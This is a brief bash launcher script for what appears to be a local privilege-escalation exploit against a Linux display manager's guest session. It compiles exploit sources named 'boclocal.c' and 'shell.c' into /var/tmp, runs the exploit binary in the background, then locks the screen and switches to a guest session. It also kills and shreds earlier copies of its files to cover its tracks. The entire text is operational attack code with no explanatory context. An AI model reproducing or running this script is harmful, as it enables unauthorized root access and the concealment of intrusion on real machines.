#!/bin/bash
if [ "${PWD}" == "/var/tmp/kodek" ]; then
/usr/bin/killall -9 /var/tmp/boc >/dev/null 2>&1
/usr/bin/killall -9 boc >/dev/null 2>&1
/bin/sleep 3s
/usr/bin/shred -fu /var/tmp/run.sh /var/tmp/shell /var/tmp/boc >/dev/null 2>&1
/usr/bin/gcc boclocal.c -Wall -s -o /var/tmp/boc
/usr/bin/gcc shell.c -Wall -s -o /var/tmp/shell
/bin/cp /var/tmp/kodek/run.sh /var/tmp/run.sh
/var/tmp/boc &
/bin/sleep 5s
XDG_SEAT_PATH="/org/freedesktop/DisplayManager/Seat0" /usr/bin/dm-tool lock
XDG_SEAT_PATH="/org/freedesktop/DisplayManager/Seat0" /usr/bin/dm-tool switch-to-guest
else
echo "[!] run me from /var/tmp/kodek"
exit
fi
